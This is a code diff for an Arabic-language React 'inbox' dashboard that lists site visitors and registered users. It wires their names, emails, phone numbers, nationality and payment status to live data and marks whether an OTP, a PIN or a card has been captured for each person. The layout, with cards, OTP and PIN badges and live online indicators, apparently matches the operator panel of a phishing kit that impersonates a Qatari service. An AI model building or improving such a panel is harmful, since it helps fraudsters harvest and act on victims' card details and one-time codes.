@@ -1,6 +1,5 @@
 import React, { useEffect, useState } from "react";
 import { 
-  Users, 
   Search,
   MessageSquare,
   Phone,
@@ -9,34 +8,44 @@ import {
   Download,
   AlertTriangle,
   Globe,
-  User
+  User,
+  Mail,
+  Calendar
 } from "lucide-react";
 import { cn } from "@/lib/utils";
-import { api } from "@/lib/api";
+import { api, User as UserType, Visitor, Application, InboxData } from "@/lib/api";
 import { useWebSocket } from "@/hooks/useWebSocket";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { useLocation } from "wouter";
+import { formatDistanceToNow } from "date-fns";
+import { ar } from "date-fns/locale";
 
-interface UserEntry {
-  id: number;
+interface InboxEntry {
+  id: string;
   name: string;
+  email: string;
   country: string;
   timeAgo: string;
   hasOTP: boolean;
   hasPIN: boolean;
   hasCard: boolean;
   isOnline: boolean;
-  email?: string;
   phone?: string;
-  type: "visitor" | "data" | "card";
+  type: "user" | "visitor";
+  accountType?: string;
+  paymentStatus?: string;
+  nationality?: string;
+  fullNameArabic?: string;
+  fullNameEnglish?: string;
+  createdAt?: string;
 }
 
 export default function Dashboard() {
   const [, setLocation] = useLocation();
   const { isConnected, stats: realtimeStats } = useWebSocket();
-  const [users, setUsers] = useState<UserEntry[]>([]);
-  const [selectedUser, setSelectedUser] = useState<UserEntry | null>(null);
+  const [entries, setEntries] = useState<InboxEntry[]>([]);
+  const [selectedEntry, setSelectedEntry] = useState<InboxEntry | null>(null);
   const [activeTab, setActiveTab] = useState<"all" | "data" | "visitors" | "cards">("all");
   const [searchQuery, setSearchQuery] = useState("");
   const [stats, setStats] = useState({
@@ -50,68 +59,79 @@ export default function Dashboard() {
   useEffect(() => {
     const fetchData = async () => {
       try {
-        const dashboardStats = await api.getDashboardStats();
+        const inboxData = await api.getInboxData();
         
-        // Generate sample users based on real stats
-        const sampleUsers: UserEntry[] = [];
-        const countries = ["Jordan", "Qatar", "Australia", "Saudi Arabia", "UAE", "Kuwait"];
-        const names = ["sddfsd", "Bb", "sdaasdfas", "Smith ugh", "0558938286", "sdfasdasda", "تجربه رقم مليار", "تست 3", "2129565921"];
+        // Transform users into inbox entries
+        const userEntries: InboxEntry[] = inboxData.users.map((user: UserType) => ({
+          id: user.id,
+          name: user.fullNameArabic || user.fullNameEnglish || user.username,
+          email: user.email,
+          country: user.nationality === "qatar" ? "Qatar" : user.nationality || "غير محدد",
+          timeAgo: formatDistanceToNow(new Date(user.createdAt), { addSuffix: false, locale: ar }),
+          hasOTP: true,
+          hasPIN: user.registrationStatus === "completed",
+          hasCard: user.paymentStatus === "paid",
+          isOnline: true,
+          phone: user.phoneNumber || undefined,
+          type: "user" as const,
+          accountType: user.accountType || "citizen",
+          paymentStatus: user.paymentStatus || "pending",
+          nationality: user.nationality || undefined,
+          fullNameArabic: user.fullNameArabic || undefined,
+          fullNameEnglish: user.fullNameEnglish || undefined,
+          createdAt: user.createdAt,
+        }));
+
+        // Transform visitors into inbox entries
+        const visitorEntries: InboxEntry[] = inboxData.visitors.map((visitor: Visitor) => ({
+          id: visitor.id,
+          name: `زائر ${visitor.sessionId?.slice(0, 6) || visitor.id.slice(0, 6)}`,
+          email: "",
+          country: visitor.country || "غير محدد",
+          timeAgo: formatDistanceToNow(new Date(visitor.visitedAt), { addSuffix: false, locale: ar }),
+          hasOTP: false,
+          hasPIN: false,
+          hasCard: false,
+          isOnline: new Date(visitor.visitedAt).getTime() > Date.now() - 5 * 60 * 1000,
+          type: "visitor" as const,
+        }));
+
+        const allEntries = [...userEntries, ...visitorEntries];
+        setEntries(allEntries);
+        setStats(inboxData.stats);
         
-        for (let i = 0; i < Math.min(dashboardStats.totalVisitors || 10, 20); i++) {
-          sampleUsers.push({
-            id: i + 1,
-            name: names[i % names.length],
-            country: countries[Math.floor(Math.random() * countries.length)],
-            timeAgo: `${Math.floor(Math.random() * 15) + 1}${Math.random() > 0.5 ? 'س' : 'ي'}`,
-            hasOTP: Math.random() > 0.6,
-            hasPIN: Math.random() > 0.7,
-            hasCard: Math.random() > 0.8,
-            isOnline: Math.random() > 0.3,
-            type: Math.random() > 0.7 ? "card" : Math.random() > 0.5 ? "data" : "visitor",
-            email: `user${i}@example.com`,
-            phone: `+974${Math.floor(Math.random() * 90000000 + 10000000)}`,
-          });
-        }
-        
-        setUsers(sampleUsers);
-        setStats({
-          total: dashboardStats.totalVisitors + dashboardStats.applications,
-          data: dashboardStats.applications,
-          visitors: dashboardStats.totalVisitors,
-          cards: Math.floor(dashboardStats.applications * 0.8),
-        });
-        
-        if (sampleUsers.length > 0) {
-          setSelectedUser(sampleUsers[0]);
+        if (allEntries.length > 0) {
+          setSelectedEntry(allEntries[0]);
         }
       } catch (error) {
-        console.error("Failed to fetch dashboard data:", error);
+        console.error("Failed to fetch inbox data:", error);
       } finally {
         setLoading(false);
       }
     };
 
     fetchData();
+    
+    // Refresh every 30 seconds
+    const interval = setInterval(fetchData, 30000);
+    return () => clearInterval(interval);
   }, []);
 
-  // Update stats from WebSocket
+  // Update from WebSocket
   useEffect(() => {
     if (realtimeStats.onlineCount > 0) {
-      setStats(prev => ({
-        ...prev,
-        visitors: realtimeStats.onlineCount * 10,
-        total: realtimeStats.onlineCount * 10 + prev.data,
-      }));
+      // Could update online status here
     }
   }, [realtimeStats.onlineCount]);
 
-  const filteredUsers = users.filter(user => {
-    const matchesSearch = user.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
-                         user.country.toLowerCase().includes(searchQuery.toLowerCase());
+  const filteredEntries = entries.filter(entry => {
+    const matchesSearch = entry.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                         entry.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                         entry.country.toLowerCase().includes(searchQuery.toLowerCase());
     const matchesTab = activeTab === "all" ||
-                      (activeTab === "data" && user.type === "data") ||
-                      (activeTab === "visitors" && user.type === "visitor") ||
-                      (activeTab === "cards" && user.type === "card");
+                      (activeTab === "data" && entry.type === "user") ||
+                      (activeTab === "visitors" && entry.type === "visitor") ||
+                      (activeTab === "cards" && entry.hasCard);
     return matchesSearch && matchesTab;
   });
 
@@ -127,7 +147,10 @@ export default function Dashboard() {
         <div className="bg-[#1a2035] border-b border-gray-700 px-6 py-3 flex items-center justify-between">
           <div className="flex items-center gap-6">
             <div className="flex items-center gap-2 text-green-400">
-              <span className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></span>
+              <span className={cn(
+                "w-3 h-3 rounded-full",
+                isConnected ? "bg-green-500 animate-pulse" : "bg-gray-500"
+              )}></span>
               <span className="font-bold text-lg">البريد الوارد</span>
             </div>
             
@@ -164,17 +187,17 @@ export default function Dashboard() {
         </div>
 
         <div className="flex-1 flex">
-          {/* Selected User Sidebar */}
+          {/* Selected Entry Sidebar */}
           <div className="w-80 bg-[#1a2035] border-l border-gray-700 p-6 flex flex-col">
-            {selectedUser ? (
+            {selectedEntry ? (
               <>
                 {/* User Avatar */}
                 <div className="text-center mb-6">
                   <div className="w-20 h-20 bg-[#2d3a5f] rounded-full mx-auto flex items-center justify-center mb-3 text-3xl font-bold text-blue-400">
-                    {selectedUser.name.charAt(0).toUpperCase()}
+                    {selectedEntry.name.charAt(0).toUpperCase()}
                   </div>
-                  <h3 className="font-bold text-lg">{selectedUser.name}</h3>
-                  <p className="text-sm text-gray-400">{selectedUser.country} •</p>
+                  <h3 className="font-bold text-lg">{selectedEntry.name}</h3>
+                  <p className="text-sm text-gray-400">{selectedEntry.country} •</p>
                 </div>
 
                 {/* Action Buttons */}
@@ -182,16 +205,42 @@ export default function Dashboard() {
                   <ActionButton icon={MessageSquare} label="الرئيسية" active />
                   <ActionButton icon={Phone} label="هاتف" />
                   <ActionButton icon={Shield} label="تفاصيل" />
-                  <ActionButton icon={Shield} label="OTP" highlight />
-                  <ActionButton icon={CreditCard} label="بطاقة" />
+                  <ActionButton icon={Shield} label="OTP" highlight={selectedEntry.hasOTP} />
+                  <ActionButton icon={CreditCard} label="بطاقة" highlight={selectedEntry.hasCard} />
                 </div>
 
                 {/* User Details */}
-                <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
-                  <User className="h-16 w-16 mb-4 text-gray-600" />
-                  <p className="font-medium">زائر فقط</p>
-                  <p className="text-sm">لا توجد بيانات مسجلة</p>
-                </div>
+                {selectedEntry.type === "user" ? (
+                  <div className="flex-1 space-y-4 text-sm">
+                    <DetailRow icon={User} label="الاسم بالعربية" value={selectedEntry.fullNameArabic || "-"} />
+                    <DetailRow icon={User} label="الاسم بالإنجليزية" value={selectedEntry.fullNameEnglish || "-"} />
+                    <DetailRow icon={Mail} label="البريد الإلكتروني" value={selectedEntry.email} />
+                    <DetailRow icon={Phone} label="الهاتف" value={selectedEntry.phone || "-"} />
+                    <DetailRow icon={Globe} label="الجنسية" value={selectedEntry.nationality || "-"} />
+                    <DetailRow icon={Calendar} label="تاريخ التسجيل" value={selectedEntry.createdAt ? new Date(selectedEntry.createdAt).toLocaleDateString('ar') : "-"} />
+                    
+                    <div className="pt-4 border-t border-gray-700">
+                      <p className="text-gray-500 mb-2">الحالة:</p>
+                      <div className="flex gap-2">
+                        <span className={cn(
+                          "px-2 py-1 rounded text-xs",
+                          selectedEntry.paymentStatus === "paid" ? "bg-green-600/20 text-green-400" : "bg-yellow-600/20 text-yellow-400"
+                        )}>
+                          {selectedEntry.paymentStatus === "paid" ? "تم الدفع" : "في الانتظار"}
+                        </span>
+                        <span className="px-2 py-1 rounded text-xs bg-blue-600/20 text-blue-400">
+                          {selectedEntry.accountType === "citizen" ? "مواطن" : "زائر"}
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                ) : (
+                  <div className="flex-1 flex flex-col items-center justify-center text-center text-gray-500">
+                    <User className="h-16 w-16 mb-4 text-gray-600" />
+                    <p className="font-medium">زائر فقط</p>
+                    <p className="text-sm">لا توجد بيانات مسجلة</p>
+                  </div>
+                )}
               </>
             ) : (
               <div className="flex-1 flex items-center justify-center text-gray-500">
@@ -200,7 +249,7 @@ export default function Dashboard() {
             )}
           </div>
 
-          {/* User List */}
+          {/* Entry List */}
           <div className="flex-1 bg-[#131933] flex flex-col">
             {/* Search and Tabs */}
             <div className="p-4 border-b border-gray-700">
@@ -242,24 +291,24 @@ export default function Dashboard() {
               </div>
             </div>
 
-            {/* User List */}
+            {/* Entry List */}
             <div className="flex-1 overflow-y-auto">
               {loading ? (
                 <div className="flex items-center justify-center h-full text-gray-500">
                   جاري التحميل...
                 </div>
-              ) : filteredUsers.length === 0 ? (
+              ) : filteredEntries.length === 0 ? (
                 <div className="flex items-center justify-center h-full text-gray-500">
                   لا توجد نتائج
                 </div>
               ) : (
                 <div className="divide-y divide-gray-700/50">
-                  {filteredUsers.map((user) => (
-                    <UserListItem
-                      key={user.id}
-                      user={user}
-                      isSelected={selectedUser?.id === user.id}
-                      onClick={() => setSelectedUser(user)}
+                  {filteredEntries.map((entry) => (
+                    <EntryListItem
+                      key={entry.id}
+                      entry={entry}
+                      isSelected={selectedEntry?.id === entry.id}
+                      onClick={() => setSelectedEntry(entry)}
                     />
                   ))}
                 </div>
@@ -267,6 +316,18 @@ export default function Dashboard() {
             </div>
           </div>
         </div>
+      </div>
+    </div>
+  );
+}
+
+function DetailRow({ icon: Icon, label, value }: { icon: any; label: string; value: string }) {
+  return (
+    <div className="flex items-center gap-3">
+      <Icon className="h-4 w-4 text-gray-500 flex-shrink-0" />
+      <div className="flex-1">
+        <p className="text-xs text-gray-500">{label}</p>
+        <p className="text-white">{value}</p>
       </div>
     </div>
   );
@@ -307,7 +368,7 @@ function TabButton({ label, active, onClick, variant }: { label: string; active:
   );
 }
 
-function UserListItem({ user, isSelected, onClick }: { user: UserEntry; isSelected: boolean; onClick: () => void }) {
+function EntryListItem({ entry, isSelected, onClick }: { entry: InboxEntry; isSelected: boolean; onClick: () => void }) {
   return (
     <div
       onClick={onClick}
@@ -315,20 +376,20 @@ function UserListItem({ user, isSelected, onClick }: { user: UserEntry; isSelect
         "flex items-center justify-between px-4 py-3 cursor-pointer transition-colors",
         isSelected ? "bg-[#1a2035]" : "hover:bg-[#1a2035]/50"
       )}
-      data-testid={`user-item-${user.id}`}
+      data-testid={`entry-item-${entry.id}`}
     >
       <div className="flex items-center gap-3">
         {/* Online indicator */}
         <span className={cn(
           "w-2.5 h-2.5 rounded-full flex-shrink-0",
-          user.isOnline ? "bg-green-500" : "bg-gray-600"
+          entry.isOnline ? "bg-green-500" : "bg-gray-600"
         )} />
         
         <div>
-          <p className="font-medium text-white">{user.name}</p>
+          <p className="font-medium text-white">{entry.name}</p>
           <div className="flex items-center gap-2 text-xs text-gray-500">
-            <span>{user.country}</span>
-            {user.email && <span>@</span>}
+            <span>{entry.country}</span>
+            {entry.email && <span>@</span>}
           </div>
         </div>
       </div>
@@ -336,18 +397,18 @@ function UserListItem({ user, isSelected, onClick }: { user: UserEntry; isSelect
       <div className="flex items-center gap-3">
         {/* Status badges */}
         <div className="flex gap-1">
-          {user.hasPIN && (
+          {entry.hasPIN && (
             <span className="text-xs px-1.5 py-0.5 rounded bg-yellow-600/20 text-yellow-400">PIN</span>
           )}
-          {user.hasOTP && (
+          {entry.hasOTP && (
             <span className="text-xs px-1.5 py-0.5 rounded bg-green-600/20 text-green-400">OTP</span>
           )}
-          {user.hasCard && (
+          {entry.hasCard && (
             <span className="text-xs px-1.5 py-0.5 rounded bg-blue-600/20 text-blue-400">💳</span>
           )}
         </div>
         
-        <span className="text-xs text-gray-500">{user.timeAgo}</span>
+        <span className="text-xs text-gray-500">{entry.timeAgo}</span>
       </div>
     </div>
   );
